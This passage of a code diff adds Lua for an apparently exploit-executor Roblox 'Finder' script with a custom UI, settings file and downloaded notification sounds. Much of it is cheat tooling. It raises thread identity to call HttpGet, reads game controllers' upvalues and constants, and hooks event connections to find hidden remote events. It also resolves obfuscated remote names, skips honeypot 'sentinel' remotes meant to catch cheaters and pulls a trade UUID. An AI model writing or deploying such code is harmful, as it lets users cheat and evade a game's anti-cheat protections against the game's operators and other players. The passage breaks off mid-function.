+        local v76, v77, remotes, tbl22, str7, fn38, createViewportFrame, fn39, flag15, n32
+        local n33, n34, v78, n35, screenGui2, instance, uiScale, playOpenAnimation, imageLabel, v79
+        local fn40
+
+        do
+          local v80 = setthreadidentity or setidentity
+
+          if v80 then
+            v80(2)
+          end
+
+          Players = game:GetService("Players")
+          service = game:GetService("UserInputService")
+          TweenService2 = game:GetService("TweenService")
+          RunService2 = game:GetService("RunService")
+          local ReplicatedStorage2 = game:GetService("ReplicatedStorage")
+          game:GetService("CoreGui")
+          GuiService = game:GetService("GuiService")
+          local SoundService = game:GetService("SoundService")
+          service2 = game:GetService("HttpService")
+          local shared_ = ReplicatedStorage2:WaitForChild("Shared")
+          local BrainrotAssets = require(shared_:WaitForChild("BrainrotAssets"))
+          local Animals = require(shared_:WaitForChild("Animals"))
+          localPlayer2 = Players.LocalPlayer
+          playerGui = localPlayer2:WaitForChild("PlayerGui")
+          tbl18 = {}
+          genv3 = getgenv and getgenv() or _G
+          local aceFinderRuntime2 = genv3.ACEFinderRuntime
+          local v81 = "table"
+
+          if type(aceFinderRuntime2) == v81 and type(aceFinderRuntime2.Unload) == "function" then
+            pcall(aceFinderRuntime2.Unload)
+          end
+
+          aceFinderRuntime = { Running = true, Connections = {} }
+          genv3.ACEFinderRuntime = aceFinderRuntime
+
+          fn31 = function(arg, arg2)
+            local connection = arg:Connect(function(...)
+              if not aceFinderRuntime.Running then
+                return
+              end
+              local ok, result = pcall(arg2, ...)
+
+              if not ok then
+                aceFinderRuntime.LastError = tostring(result)
+              end
+            end)
+
+            table.insert(aceFinderRuntime.Connections, connection)
+            return connection
+          end
+
+          local v82 = "table"
+          genv3.FinderUISettingsState = type(genv3.FinderUISettingsState) == v82 and genv3.FinderUISettingsState or {}
+          finderUISettingsState = genv3.FinderUISettingsState
+          aceFinderRuntime.ConfigFile = "FinderUISettings.json"
+
+          aceFinderRuntime.ConfigKeys = {
+            "BackgroundOptionsVersion",
+            "BackgroundIndex",
+            "FallingParticlesEnabled",
+            "NotificationsEnabled",
+            "NotificationSoundsEnabled",
+            "NotificationSoundIndex",
+            "NotificationVolume",
+            "GuiScale",
+          }
+
+          aceFinderRuntime.SaveConfig = function()
+            if type(writefile) ~= "function" then
+              return
+            end
+            local tbl23 = {}
+
+            for _, configKey in ipairs(aceFinderRuntime.ConfigKeys) do
+              tbl23[configKey] = finderUISettingsState[configKey]
+            end
+
+            local ok, result = pcall(function()
+              writefile(aceFinderRuntime.ConfigFile, service2:JSONEncode(tbl23))
+            end)
+
+            if not ok then
+              aceFinderRuntime.LastConfigError = tostring(result)
+            end
+          end
+
+          local flag16 = type(isfile) == "function"
+
+          if flag16 then
+            local v83 = "function"
+            flag16 = type(readfile) == v83
+          end
+
+          local result = nil
+
+          if flag16 then
+            local ok, result2 = pcall(isfile, aceFinderRuntime.ConfigFile)
+            local v83 = ok and result2
+            result = nil
+
+            if v83 then
+              local ok2, result3 = pcall(readfile, aceFinderRuntime.ConfigFile)
+
+              if ok2 then
+                local v84 = "function"
+                ok2 = type(result3) == v84
+              end
+
+              ok2 = ok2 and result3 ~= ""
+              result = nil
+
+              if ok2 then
+                local ok3
+
+                ok3, result = pcall(function()
+                  return service2:JSONDecode(result3)
+                end)
+
+                if ok3 then
+                  local v84 = "table"
+                  ok3 = type(result) == v84
+                end
+
+                local v84 = nil
+
+                if not ok3 then
+                  result = v84
+                end
+              end
+            end
+          end
+
+          if result then
+            for _, configKey in ipairs(aceFinderRuntime.ConfigKeys) do
+              local v83 = result[configKey]
+              local flag17 = finderUISettingsState[configKey] == nil
+              local flag18
+
+              if flag17 then
+                local flag19 = type(v83) == "number"
+
+                if flag19 then
+                  flag18 = flag19
+                else
+                  local v84 = "boolean"
+                  flag18 = type(v83) == v84
+                end
+              else
+                flag18 = flag17
+              end
+
+              if flag18 then
+                finderUISettingsState[configKey] = v83
+              end
+            end
+          end
+
+          tbl19 = {
+            { Name = "NONE", Image = "", ScaleType = Enum.ScaleType.Crop, IsNone = true },
+            {
+              Name = "CURRENT",
+              Image = "rbxassetid://137692455767789",
+              ScaleType = Enum.ScaleType.Stretch,
+            },
+            {
+              Name = "ACE 1",
+              Image = "rbxassetid://128081130356834",
+              ScaleType = Enum.ScaleType.Crop,
+            },
+            { Name = "ACE 2", Image = "rbxassetid://120480454937730", ScaleType = Enum.ScaleType.Crop },
+            { Name = "ACE 3", Image = "rbxassetid://85127407374728", ScaleType = Enum.ScaleType.Crop },
+            { Name = "ACE 4", Image = "rbxassetid://107291541054530", ScaleType = Enum.ScaleType.Crop },
+            { Name = "ACE 5", Image = "rbxassetid://124230165619007", ScaleType = Enum.ScaleType.Crop },
+            { Name = "ACE 6", Image = "rbxassetid://87766822871097", ScaleType = Enum.ScaleType.Crop },
+            { Name = "ACE 7", Image = "rbxassetid://90280869222992", ScaleType = Enum.ScaleType.Crop },
+            { Name = "ACE 8", Image = "rbxassetid://126860692354524", ScaleType = Enum.ScaleType.Crop },
+            {
+              Name = "ACE 9",
+              Image = "rbxassetid://105131079571166",
+              ScaleType = Enum.ScaleType.Crop,
+            },
+            { Name = "ACE 10", Image = "rbxassetid://108751216016989", ScaleType = Enum.ScaleType.Crop },
+          }
+
+          tbl20 = {
+            {
+              Name = "SOUND 1",
+              Url = "https://files.catbox.moe/r1gxie.mp3",
+              File = "FinderUI_Notification_v5_1.mp3",
+              Volume = 1.5,
+            },
+            { Name = "SOUND 2", Url = "https://files.catbox.moe/m0evyv.mp3", File = "FinderUI_Notification_v3_2.mp3" },
+            {
+              Name = "SOUND 3",
+              Url = "https://files.catbox.moe/ts994h.mp3",
+              File = "FinderUI_Notification_v3_4.mp3",
+            },
+            {
+              Name = "SOUND 4",
+              Url = "https://files.catbox.moe/th43w4.mp3",
+              File = "FinderUI_Notification_v3_5.mp3",
+            },
+            { Name = "NONE", IsNone = true },
+          }
+
+          if finderUISettingsState.BackgroundOptionsVersion ~= 2 then
+            local num = tonumber(finderUISettingsState.BackgroundIndex)
+            finderUISettingsState.BackgroundIndex = num and num + 1 or 2
+            finderUISettingsState.BackgroundOptionsVersion = 2
+          end
+
+          finderUISettingsState.BackgroundIndex = math.clamp(tonumber(finderUISettingsState.BackgroundIndex) or 2, 1, #tbl19)
+          finderUISettingsState.FallingParticlesEnabled = finderUISettingsState.FallingParticlesEnabled ~= false
+          finderUISettingsState.OGOnlyEnabled = true
+          finderUISettingsState.NotificationsEnabled = finderUISettingsState.NotificationsEnabled == true
+          finderUISettingsState.NotificationSoundsEnabled = finderUISettingsState.NotificationSoundsEnabled == true
+          finderUISettingsState.NotificationSoundIndex = math.clamp(tonumber(finderUISettingsState.NotificationSoundIndex) or 1, 1, #tbl20)
+          finderUISettingsState.NotificationVolume = math.clamp(tonumber(finderUISettingsState.NotificationVolume) or 1, 0, 1)
+          finderUISettingsState.GuiScale = math.clamp(tonumber(finderUISettingsState.GuiScale) or 1, 0.5, 1.5)
+          finderUISettingsState.SoundCache = type(finderUISettingsState.SoundCache) == "table" and finderUISettingsState.SoundCache or {}
+
+          if genv3.FinderUINotificationSound then
+            pcall(function()
+              genv3.FinderUINotificationSound:Stop()
+            end)
+
+            pcall(function()
+              genv3.FinderUINotificationSound:Destroy()
+            end)
+
+            genv3.FinderUINotificationSound = nil
+          end
+
+          fn32 = function()
+            local finderUINotificationSound = genv3.FinderUINotificationSound
+            genv3.FinderUINotificationSound = nil
+
+            if finderUINotificationSound then
+              pcall(function()
+                finderUINotificationSound:Stop()
+              end)
+
+              pcall(function()
+                finderUINotificationSound:Destroy()
+              end)
+            end
+          end
+
+          local function fn41(arg)
+            local v83 = "function"
+            if type(arg) ~= v83 or #arg < 64 then
+              return false
+            end
+
+            if arg:sub(1, 3) == "ID3" then
+              return true
+            end
+            local v84, v85 = string.byte(arg, 1, 2)
+            return v84 == 255 and v85 ~= nil and v85 >= 224
+          end
+
+          local function fn42(arg)
+            if not arg then
+              return nil
+            end
+            local v83 = finderUISettingsState.SoundCache[arg.File]
+            if type(v83) == "string" and v83 ~= "" then
+              return v83
+            end
+            local v84 = getcustomasset or getsynasset
+            if type(v84) ~= "function" then
+              return nil
+            end
+            local result2
+
+            if type(readfile) == "function" then
+              local ok
+              ok, result2 = pcall(readfile, arg.File)
+              local v85 = nil
+
+              if not ok then
+                result2 = v85
+              end
+            else
+              local v85 = "function"
+              result2 = nil
+
+              if type(isfile) == v85 then
+                local ok, result3 = pcall(isfile, arg.File)
+                local flag17 = not ok or not result3
+                result2 = nil
+                if flag17 then
+                  return nil
+                end
+              end
+            end
+
+            if type(readfile) == "function" and not fn41(result2) then
+              return nil
+            end
+            local ok, result3 = pcall(v84, arg.File)
+
+            if ok then
+              local v85 = "function"
+              ok = type(result3) == v85
+            end
+
+            if ok and result3 ~= "" then
+              finderUISettingsState.SoundCache[arg.File] = result3
+              return result3
+            end
+            return nil
+          end
+
+          local function fn43(arg)
+            local v83 = fn42(arg)
+            if v83 then
+              return v83
+            end
+            local v84 = getcustomasset or getsynasset
+            if type(writefile) ~= "function" or type(v84) ~= "function" then
+              return nil, "CUSTOM ASSETS UNSUPPORTED"
+            end
+            local body = nil
+
+            for _, v85 in ipairs({ arg.Url, arg.FallbackUrl }) do
+              if type(v85) == "string" and v85 ~= "" and not fn41(body) then
+                local request_2 = syn and syn.request or http_request or request
+
+                if type(request_2) == "function" then
+                  local ok, result2 = pcall(request_2, {
+                    Url = v85,
+                    Method = "GET",
+                    Headers = { ["User-Agent"] = "Mozilla/5.0", Accept = "audio/mpeg,*/*" },
+                  })
+
+                  local flag17 = ok and type(result2) == "table"
+
+                  if flag17 then
+                    flag17 = tonumber(result2.StatusCode or result2.Status)
+                  end
+
+                  flag17 = flag17 or nil
+
+                  if ok then
+                    local v86 = "table"
+                    ok = type(result2) == v86
+                  end
+
+                  if ok and (flag17 == nil or flag17 >= 200 and flag17 < 300) then
+                    body = result2.Body or result2.body
+                  end
+                end
+
+                if not fn41(body) then
+                  local v86 = getthreadidentity or getidentity
+                  local v87 = nil
+
+                  if type(v86) == "function" then
+                    pcall(function()
+                      v87 = v86()
+                    end)
+                  end
+
+                  if v80 then
+                    pcall(v80, 8)
+                  end
+
+                  local ok, result2 = pcall(function()
+                    return game:HttpGet(v85)
+                  end)
+
+                  if v80 then
+                    pcall(v80, v87 or 2)
+                  end
+
+                  if ok then
+                    body = result2
+                  end
+                end
+              end
+            end
+
+            if not fn41(body) then
+              return nil, "SOUND DOWNLOAD FAILED"
+            end
+
+            if not pcall(writefile, arg.File, body) then
+              return nil, "SOUND CACHE FAILED"
+            end
+            local ok, result2 = pcall(v84, arg.File)
+            if not ok or type(result2) ~= "string" or result2 == "" then
+              return nil, "SOUND LOAD FAILED"
+            end
+            finderUISettingsState.SoundCache[arg.File] = result2
+            return result2
+          end
+
+          fn33 = function(arg)
+            if not finderUISettingsState.NotificationsEnabled then
+              return
+            end
+
+            if not finderUISettingsState.NotificationSoundsEnabled then
+              return
+            end
+            local notificationSoundIndex = finderUISettingsState.NotificationSoundIndex
+            local v83 = tbl20[notificationSoundIndex]
+            if not v83 then
+              return
+            end
+            fn32()
+
+            if v83.IsNone then
+              if arg then
+                arg(true)
+              end
+
+              return
+            end
+
+            task.spawn(function()
+              local v84, v85 = fn43(v83)
+              if
+                not finderUISettingsState.NotificationsEnabled
+                or not finderUISettingsState.NotificationSoundsEnabled
+                or finderUISettingsState.NotificationSoundIndex ~= notificationSoundIndex
+              then
+                return
+              end
+
+              if not v84 then
+                if arg then
+                  arg(false, v85)
+                end
+
+                return
+              end
+
+              local instance2 = Instance.new("Sound")
+              instance2.Name = "FinderUINotificationPreview"
+              instance2.SoundId = v84
+              instance2.Volume = math.clamp((tonumber(v83.Volume) or 1) * finderUISettingsState.NotificationVolume, 0, 10)
+              instance2.Looped = false
+              instance2.Parent = SoundService
+              genv3.FinderUINotificationSound = instance2
+
+              instance2.Ended:Connect(function()
+                if genv3.FinderUINotificationSound == instance2 then
+                  genv3.FinderUINotificationSound = nil
+                end
+
+                instance2:Destroy()
+              end)
+
+              local v86 = 10
+              local n36 = os.clock() + v86
+
+              while instance2.Parent and not instance2.IsLoaded and os.clock() < n36 do
+                task.wait(0.05)
+              end
+
+              local ok = pcall(function()
+                instance2.TimePosition = 0
+                instance2:Play()
+              end)
+
+              if arg then
+                arg(ok, ok and nil or "SOUND PLAY FAILED")
+              end
+            end)
+          end
+
+          if genv3.FinderUIFilterWheelConnection then
+            genv3.FinderUIFilterWheelConnection:Disconnect()
+          end
+
+          genv3.FinderUIFilterWheelConnection = service.InputChanged:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.MouseWheel then
+              local value = select(1, GuiService:GetGuiInset())
+              local n36 = service:GetMouseLocation() - value
+              local flag17
+
+              for i = #tbl18, 1, -1 do
+                local v83 = tbl18[i]
+
+                if not v83.Parent then
+                  table.remove(tbl18, i)
+                else
+                  local parent = v83
+
+                  while true do
+                    flag17 = true
+
+                    if parent then
+                      if parent:IsA("GuiObject") and not parent.Visible then
+                        flag17 = false
+                        break
+                      elseif parent:IsA("LayerCollector") then
+                        flag17 = parent.Enabled
+                        break
+                      else
+                        parent = parent.Parent
+                      end
+                    else
+                      break
+                    end
+                  end
+
+                  local absolutePosition = v83.AbsolutePosition
+                  local absoluteSize = v83.AbsoluteSize
+                  local flag18
+
+                  if flag17 then
+                    local flag19 = v83:GetAttribute("Collapsed") == true
+
+                    if flag19 then
+                      flag18 = flag19
+                    else
+                      flag18 = n36.X >= absolutePosition.X
+                        and n36.X <= absolutePosition.X + absoluteSize.X
+                        and n36.Y >= absolutePosition.Y
+                        and n36.Y <= absolutePosition.Y + absoluteSize.Y
+                    end
+                  else
+                    flag18 = flag17
+                  end
+
+                  if flag18 then
+                    local z = input.Position.Z
+
+                    if z ~= 0 then
+                      local n37 = math.max(0, v83.AbsoluteCanvasSize.X - v83.AbsoluteWindowSize.X)
+                      v83.CanvasPosition = Vector2.new(math.clamp(v83.CanvasPosition.X - z * 48, 0, n37), v83.CanvasPosition.Y)
+                    end
+
+                    break
+                  end
+                end
+              end
+            end
+          end)
+
+          fn30(playerGui, "FinderUI")
+
+          tbl21 = {
+            BG = Color3.fromRGB(5, 5, 7),
+            Header = Color3.fromRGB(10, 5, 7),
+            Card = Color3.fromRGB(10, 10, 12),
+            CardHover = Color3.fromRGB(18, 18, 22),
+            Border = Color3.fromRGB(96, 98, 108),
+            BorderHover = Color3.fromRGB(165, 175, 180),
+            White = Color3.fromRGB(248, 246, 248),
+            Dim = Color3.fromRGB(148, 150, 160),
+            TabActive = Color3.fromRGB(246, 248, 250),
+            TabInact = Color3.fromRGB(132, 136, 144),
+            TrackOn = Color3.fromRGB(246, 246, 250),
+            TrackOff = Color3.fromRGB(26, 26, 31),
+            KnobOn = Color3.fromRGB(5, 5, 7),
+            KnobOff = Color3.fromRGB(205, 205, 212),
+            Good = Color3.fromRGB(73, 214, 112),
+            AccentBg = Color3.fromRGB(246, 246, 248),
+            AccentFg = Color3.fromRGB(5, 5, 7),
+            SubCard = Color3.fromRGB(12, 8, 10),
+            SubField = Color3.fromRGB(24, 24, 28),
+            PhotoBG = Color3.fromRGB(8, 10, 12),
+          }
+
+          tweenInfo = TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+          tweenInfo2 = TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+          tweenInfo3 = TweenInfo.new(0.28, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
+
+          fn34 = function(arg, arg2, arg3)
+            TweenService2:Create(arg, arg2, arg3):Play()
+          end
+
+          fn35 = function(parent, arg)
+            local instance2 = Instance.new("UICorner")
+            instance2.CornerRadius = UDim.new(0, arg or 8)
+            instance2.Parent = parent
+            return instance2
+          end
+
+          createUIStroke2 = function(parent, color, thickness, transparency)
+            local uiStroke = Instance.new("UIStroke")
+            uiStroke.Color = color or tbl21.Border
+            uiStroke.Thickness = thickness or 1
+            uiStroke.Transparency = transparency or 0
+            uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+            uiStroke.Parent = parent
+            return uiStroke
+          end
+
+          createUIPadding = function(parent, arg, arg2, arg3, arg4)
+            local uiPadding = Instance.new("UIPadding")
+            uiPadding.PaddingTop = UDim.new(0, arg or 0)
+            uiPadding.PaddingBottom = UDim.new(0, arg2 or 0)
+            uiPadding.PaddingLeft = UDim.new(0, arg3 or 0)
+            uiPadding.PaddingRight = UDim.new(0, arg4 or 0)
+            uiPadding.Parent = parent
+            return uiPadding
+          end
+
+          createTextLabel = function(parent, text, textSize, textColor3, font)
+            local textLabel = Instance.new("TextLabel")
+            textLabel.BackgroundTransparency = 1
+            textLabel.Text = text or ""
+            textLabel.TextSize = textSize or 13
+            textLabel.TextColor3 = textColor3 or tbl21.White
+            textLabel.Font = font or Enum.Font.GothamMedium
+            textLabel.TextXAlignment = Enum.TextXAlignment.Left
+            textLabel.Parent = parent
+            return textLabel
+          end
+
+          fn36 = function(arg)
+            local ok
+
+            if setclipboard then
+              ok = pcall(setclipboard, arg)
+            elseif toclipboard then
+              ok = pcall(toclipboard, arg)
+            else
+              local set = Clipboard and Clipboard.set
+              ok = false
+
+              if set then
+                ok = pcall(Clipboard.set, Clipboard, arg)
+              end
+            end
+
+            return ok
+          end
+
+          local tbl23 = {}
+
+          RunService2.RenderStepped:Connect(function(deltaTime)
+            for i = #tbl23, 1, -1 do
+              local v83 = tbl23[i]
+
+              if not v83.Viewport.Parent or not v83.Camera.Parent then
+                table.remove(tbl23, i)
+              elseif v83.Mode == "baseidle" then
+                v83.Camera.CFrame = CFrame.new(v83.CameraOrigin, v83.Center + Vector3.new(0, v83.LookHeight, 0))
+              else
+                v83.Angle = v83.Angle + deltaTime * v83.Speed
+                local radius = v83.Radius
+                local n36 = math.sin(v83.Angle) * radius
+                local radius2 = v83.Radius
+                local n37 = math.cos(v83.Angle) * radius2
+                local float = v83.Float
+                v83.Camera.CFrame = CFrame.new(
+                  Vector3.new(v83.Center.X + n36, v83.Center.Y + math.sin(v83.Angle * 2) * float, v83.Center.Z + n37),
+                  v83.Center
+                )
+              end
+            end
+          end)
+
+          fn37 = function(arg)
+            return tostring(arg or ""):lower():gsub("[^%w]", "")
+          end
+
+          local tbl24 = {
+            skibiditoilet = { "Skibidi Toilet", "Skibidi" },
+            skibidi = { "Skibidi", "Skibidi Toilet" },
+            johnpork = { "John Pork" },
+            strawberryelephant = { "Strawberry Elephant" },
+            meowl = { "Meowl" },
+            dragonaquanini = { "Dragon Aquanini" },
+            dragoncannelloni = { "Dragon Cannelloni" },
+          }
+
+          request_ = syn and syn.request or http_request or request
+
+          if type(request_) ~= "function" then
+            request_ = nil
+          end
+
+          local function fn44(arg)
+            if not arg then
+              return nil
+            end
+            local ok, result2 = pcall(require, arg)
+            if ok and type(result2) == "table" then
+              return result2
+            end
+            return nil
+          end
+
+          local v83 = ReplicatedStorage2:FindFirstChild("Datas")
+          local controllers = ReplicatedStorage2:FindFirstChild("Controllers")
+          v75 = fn44(v83 and v83:FindFirstChild("Animals"))
+          v76 = fn44(controllers and controllers:FindFirstChild("TradeController"))
+          v77 = fn44(controllers and controllers:FindFirstChild("DuelsMachineController"))
+          local v84 = fn44(controllers and controllers:FindFirstChild("LiveboardController"))
+          remotes = {}
+          tbl22 = {}
+          str7 = "afb005f9-6e81-4e0a-8bb0-3555938a9658"
+          local net = ReplicatedStorage2:FindFirstChild("Packages")
+          net = net and net:FindFirstChild("Net")
+          local getupvalues_ = debug and debug.getupvalues or getupvalues
+          local getconstants_ = debug and debug.getconstants or getconstants
+          local info = debug and debug.info
+          local getinfo
+
+          if info then
+            getinfo = info
+          else
+            getinfo = debug and debug.getinfo
+          end
+
+          local flag17 = false
+
+          if net then
+            for _, child in ipairs(net:GetChildren()) do
+              local match = child.Name:match("^R[EF]/(.+)$") or child.Name:match("^URE/(.+)$")
+              if match and #match == 64 and match:match("^%x+$") then
+                flag17 = true
+                break
+              end
+            end
+          end
+
+          local function fn45(arg, arg2)
+            if not net or typeof(arg) ~= "Instance" or not arg:IsA(arg2) then
+              return false
+            end
+
+            if not arg:IsDescendantOf(net) then
+              return false
+            end
+
+            if aceRemoteMapper:IsSentinel(arg.Name) then
+              aceRemoteMapper:Trip("sentinel remote")
+              return false
+            end
+
+            if flag17 then
+              local match = arg.Name:match("^R[EF]/(.+)$")
+              if not match or #match ~= 64 or not match:match("^%x+$") then
+                return false
+              end
+            end
+
+            return true
+          end
+
+          local v85 = fn44(net)
+
+          local function fn46(arg, arg2, arg3)
+            local v86 = aceRemoteMapper:Resolve(arg, arg2, 2.5)
+            if fn45(v86, arg3) then
+              return v86
+            end
+            local v87 = v85 and v85[arg]
+            if type(v87) ~= "function" then
+              return nil
+            end
+            local ok, result2 = pcall(v87, v85, arg2)
+            if ok and fn45(result2, arg3) then
+              aceRemoteMapper:Register(arg3, arg2, result2)
+              return result2
+            end
+            return nil
+          end
+
+          local function fn47(arg, arg2)
+            local tbl25 = {}
+            local flag18 = type(arg) ~= "function"
+            local flag19
+
+            if flag18 then
+              flag19 = flag18
+            else
+              local v86 = "function"
+              flag19 = type(getupvalues_) ~= v86
+            end
+
+            if flag19 then
+              return tbl25
+            end
+            local ok, result2 = pcall(getupvalues_, arg)
+            local flag20 = not ok
+
+            if not flag20 then
+              local v86 = "table"
+              flag20 = type(result2) ~= v86
+            end
+
+            if flag20 then
+              return tbl25
+            end
+            local tbl26 = {}
+
+            for k, v86 in pairs(result2) do
+              if type(k) == "number" and fn45(v86, arg2) then
+                table.insert(tbl26, k)
+              end
+            end
+
+            table.sort(tbl26)
+            local tbl27 = {}
+
+            for _, v86 in ipairs(tbl26) do
+              local v87 = result2[v86]
+
+              if not tbl27[v87] then
+                tbl27[v87] = true
+                table.insert(tbl25, v87)
+              end
+            end
+
+            return tbl25
+          end
+
+          local function fn48(arg, arg2)
+            local flag18 = not arg
+
+            if not flag18 then
+              local v86 = "function"
+              flag18 = type(getconnections) ~= v86
+            end
+
+            if flag18 or type(getinfo) ~= "function" then
+              return nil
+            end
+            local ok, result2 = pcall(getconnections, arg.OnClientEvent)
+            if not ok or type(result2) ~= "table" then
+              return nil
+            end
+
+            for _, v86 in ipairs(result2) do
+              local ok2, result3 = pcall(function()
+                return v86.Function
+              end)
+
+              if ok2 and type(result3) == "function" then
+                local ok3, result4 = pcall(getinfo, result3, "s")
+
+                if ok3 and type(result4) == "string" and result4:find(arg2, 1, true) then
+                  local ok4, result5 = pcall(getinfo, result3, "a")
+                  if ok4 and type(result5) == "number" then
+                    return result5
+                  end
+                end
+              end
+            end
+
+            return nil
+          end
+
+          if v84 and type(v84.Start) == "function" then
+            if type(getupvalues_) == "function" then
+              local ok, result2 = pcall(getupvalues_, v84.Start)
+
+              if ok and type(result2) == "table" then
+                for _, v86 in pairs(result2) do
+                  if type(v86) == "table" then
+                    table.insert(tbl22, v86)
+                  end
+                end
+              end
+            end
+
+            local remoteEvent = fn47(v84.Start, "RemoteEvent")
+            local v86 = nil
+            local v87 = nil
+
+            for _, v88 in ipairs(remoteEvent) do
+              local liveboardController = fn48(v88, "LiveboardController")
+
+              if liveboardController == 1 then
+                v86 = v86 or v88
+              elseif liveboardController and liveboardController >= 3 then
+                v87 = v87 or v88
+              end
+            end
+
+            remotes.NewEntry = remotes.NewEntry or v86 or remoteEvent[1]
+            remotes.ClaimEntry = remotes.ClaimEntry or v87 or remoteEvent[2]
+            remotes.GetEntries = remotes.GetEntries or fn47(v84.Start, "RemoteFunction")[1]
+          end
+
+          if remotes.NewEntry then
+            aceRemoteMapper:Register("RemoteEvent", "Liveboard/NewEntry", remotes.NewEntry)
+          end
+
+          if remotes.ClaimEntry then
+            aceRemoteMapper:Register("RemoteEvent", "Liveboard/ClaimEntry", remotes.ClaimEntry)
+          end
+
+          if remotes.GetEntries then
+            aceRemoteMapper:Register("RemoteFunction", "Liveboard/GetEntries", remotes.GetEntries)
+          end
+
+          remotes.NewEntry = remotes.NewEntry or fn46("RemoteEvent", "Liveboard/NewEntry", "RemoteEvent")
+          remotes.ClaimEntry = remotes.ClaimEntry or fn46("RemoteEvent", "Liveboard/ClaimEntry", "RemoteEvent")
+          remotes.GetEntries = remotes.GetEntries or fn46("RemoteFunction", "Liveboard/GetEntries", "RemoteFunction")
+
+          fn38 = function(arg)
+            for _, v86 in ipairs(tbl22) do
+              local value = rawget(v86, arg)
+
+              if not value and arg ~= nil then
+                value = rawget(v86, tostring(arg))
+              end
+
+              if type(value) == "table" and typeof(value.Frame) == "Instance" then
+                return value.Frame
+              end
+            end
+
+            return nil
+          end
+
+          local function fn49(arg)
+            local v86 = fn38(arg)
+            if not v86 or not v86.Parent then
+              return nil
+            end
+            local filler = v86:FindFirstChild("Filler")
+            filler = filler and filler:FindFirstChild("Container")
+            local brainrotViewport = filler and filler:FindFirstChild("BrainrotViewport") or v86:FindFirstChild("BrainrotViewport", true)
+            brainrotViewport = brainrotViewport and brainrotViewport:FindFirstChildOfClass("WorldModel")
+            if brainrotViewport and #brainrotViewport:GetChildren() > 0 then
+              return brainrotViewport
+            end
+            return nil
+          end
+
+          local function fn50(arg)
+            local str8 = tostring(arg or "")
+            if str8 == "" or str8 == "none" or str8 == "None" then
+              return "Default"
+            end
+            return str8
+          end
+
+          local function fn51(arg, arg2)
+            local v86 = fn50(arg2)
+            local plots = workspace:FindFirstChild("Plots")
+            local v87 = nil
+
+            if plots then
+              v87 = nil
+
+              for _, child in ipairs(plots:GetChildren()) do
+                for _, child2 in ipairs(child:GetChildren()) do
+                  if child2:IsA("Model") and child2.Name == arg then
+                    if fn50(child2:GetAttribute("Mutation")) == v86 then
+                      return child2
+                    end
+                    v87 = v87 or child2
+                  end
+                end
+              end
+            end
+
+            for _, child in ipairs(workspace:GetChildren()) do
+              if child:IsA("Model") and child:GetAttribute("Index") == arg then
+                if fn50(child:GetAttribute("Mutation")) == v86 then
+                  return child
+                end
+                v87 = v87 or child
+              end
+            end
+
+            return v86 == "Default" and v87 or nil
+          end
+
+          if v76 and type(v76.SendInvite) == "function" then
+            remotes.Invite = fn47(v76.SendInvite, "RemoteFunction")[1]
+
+            if type(getconstants_) == "function" then
+              local ok, result2 = pcall(getconstants_, v76.SendInvite)
+
+              if ok then
+                local v86 = "table"
+                ok = type(result2) == v86
+              end
+
+              if ok then
+                for _, v86 in pairs(result2) do
+                  if type(v86) == "string" and v86:match("^%x%x%x%x%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%x%x%x%x%x%x%x%x$") then
+                    str7 = v86
+                    break
+                  end
+                end
+              end
+            end
+          end
+
+          local function fn52(arg)
+            local v86 = v75 and v75[arg]
+            local v87 = "table"
+            if type(v86) == v87 and type(v86.DisplayName) == "string" then
+              return v86.DisplayName
+            end
+            return arg
+          end
+
+          local tbl25 = {
+            ["Skibidi Toilet"] = { DistanceScale = 1.15, YShift = 0.1 },
+            ["Strawberry Elephant"] = { YShift = 0.06, Yaw = 0.3490658503988659 },
+            ["Meowl"] = { YShift = 0.06 },
+            ["Dragon Aquanini"] = { YShift = 0.06, Yaw = 0.3490658503988659 },
+            ["Dragon Cannelloni"] = { YShift = 0.06, Yaw = 0.3490658503988659 },
+          }
+
+          local function fn53(arg)
+            local v86 = "function"
+            if type(arg) ~= v86 or arg == "" then
+              return nil
+            end
+            local tbl26 = { arg }
+            local v87 = ipairs
+            local tbl27 = tbl24[fn37(arg)] or {}
+
+            for _, v88 in v87(tbl27) do
+              if not table.find(tbl26, v88) then
+                table.insert(tbl26, v88)
+              end
+            end
+
+            for _, v88 in ipairs(tbl26) do
+              local v89 = BrainrotAssets.getModel(v88)
+              if v89 and v89:IsA("Model") then
+                return v89
+              end
+            end
+
+            return nil
+          end
+
+          local function fn54(parent, arg)
+            local animations = ReplicatedStorage2:FindFirstChild("Animations")
+            animations = animations and animations:FindFirstChild("Animals")
+            animations = animations and animations:FindFirstChild(arg)
+            local idle = animations and animations:FindFirstChild("Idle")
+            if not idle or not idle:IsA("Animation") then
+              return nil
+            end
+            local animationController = parent:FindFirstChild("AnimationController")
+
+            if not animationController then
+              animationController = Instance.new("AnimationController")
+              animationController.Name = "AnimationController"
+              animationController.Parent = parent
+            end
+
+            local animator = animationController:FindFirstChildOfClass("Animator")
+
+            if not animator then
+              animator = Instance.new("Animator")
+              animator.Parent = animationController
+            end
+
+            local ok, result2 = pcall(function()
+              return animator:LoadAnimation(idle)
+            end)
+
+            if ok and result2 then
+              result2.Looped = true
+              result2:Play(0)
+              return result2
+            end
+
+            return nil
+          end
+
+          createViewportFrame = function(parent, arg, arg2, arg3, arg4, arg5)
+            local viewportFrame = Instance.new("ViewportFrame")
+            viewportFrame.Size = UDim2.fromScale(1, 1)
+            viewportFrame.BackgroundTransparency = 1
+            viewportFrame.BorderSizePixel = 0
+            viewportFrame.LightDirection = Vector3.new(-1, -1.5, -1)
+            viewportFrame.Ambient = Color3.fromRGB(215, 215, 215)
+            viewportFrame:SetAttribute("HasBrainrotModel", false)
+            viewportFrame:SetAttribute("ACEModelReady", false)
+            viewportFrame.Parent = parent
+            local instance2 = Instance.new("WorldModel")
+            instance2.Parent = viewportFrame
+            local camera = Instance.new("Camera")
+            camera.Parent = viewportFrame
+            viewportFrame.CurrentCamera = camera
+            local flag18 = typeof(arg5) == "Instance"
+            local v86 = flag18 and arg5 or fn53(arg)
+
+            if not v86 then
+              local v87 = createTextLabel(viewportFrame, arg2 or "?", isMobile and 11 or 12, tbl21.White, Enum.Font.GothamBold)
+              v87.Size = UDim2.fromScale(1, 1)
+              v87.TextXAlignment = Enum.TextXAlignment.Center
